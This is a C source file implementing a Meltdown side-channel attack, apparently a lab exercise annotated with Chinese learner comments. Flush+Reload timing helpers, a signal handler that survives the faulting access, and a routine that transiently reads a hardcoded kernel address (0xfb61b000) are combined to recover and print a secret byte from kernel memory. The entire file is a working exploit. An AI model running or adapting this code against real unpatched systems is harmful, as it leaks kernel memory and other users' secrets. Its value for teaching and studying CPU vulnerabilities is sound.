#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
	int i;

	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
    // 通过写 array，确保 array 在内存里

	// flush the values of the array from cache
	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
    // 把 array 的 cache 都清了
}

static int scores[256];

void reloadSideChannelImproved()
{
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		 addr = &array[i * 4096 + DELTA]; // 计算得到地址
		 time1 = __rdtscp(&junk);
		 junk = *addr; // 根据地址读内存
		 time2 = __rdtscp(&junk) - time1; // 计时【读内存】的时间
		 if (time2 <= CACHE_HIT_THRESHOLD) // 如果看起来是直接读 cache 去了，那么 score++
            scores[i]++; /* if cache hit, add 1 for this value */
	}
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
	 char kernel_data = 0;
	 
	 // Give eax register something to do
     // 这段代码一直在对 返回值寄存器 做无意义运算，
     // 希望尽可能推迟 if (sigsetjmp(jbuf, 1) == 0) 的结果 写到返回值寄存器。
	 asm volatile(
			 ".rept 400;"                
			 "add $0x141, %%eax;"
			 ".endr;"                    
		
			 :
			 :
			 : "eax"
	 );
		
	 // The following statement will cause an exception
	 kernel_data = *(char*)kernel_data_addr;  
	 array[kernel_data * 4096 + DELTA] += 1;              
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
	siglongjmp(jbuf, 1); // 如果地址越界，那么再把 stack 恢复
}

int main()
{
	int i, j, ret = 0;
	
	// Register signal handler, 注册信号处理函数
	signal(SIGSEGV, catch_segv); // 好像是把 stack 存起来

	int fd = open("/proc/secret_data", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}
	
	memset(scores, 0, sizeof(scores));
	flushSideChannel();
	
		
	// Retry 1000 times on the same address.
    // 重复多次，是为了迷惑分支预测机制，让它无脑继续执行
	for (i = 0; i < 1000; i++) {
		ret = pread(fd, NULL, 0, 0); // 把 fd（secret_data 文件）预读进 cache
		if (ret < 0) {
			perror("pread");
			break;
		}
		
		// Flush the probing array
		for (j = 0; j < 256; j++) // 把 array 的 cache 都清了
			_mm_clflush(&array[j * 4096 + DELTA]);

		if (sigsetjmp(jbuf, 1) == 0) { // if 执行的东西 是把 stack 存起来，一般来说都是 == 0 的
            meltdown_asm(0xfb61b000); // 地址越界会报 SIGSEGV 信号
        }

		reloadSideChannelImproved(); // 算 scores
	}

	// Find the index with the highest score.
	int max = 0;
	for (i = 0; i < 256; i++) { // 得到 scores 最高的地址，即访问最快的
		if (scores[max] < scores[i]) max = i;
	}

	printf("The secret value is %d %c\n", max, max);
	printf("The number of hits is %d\n", scores[max]);

	return 0;
}
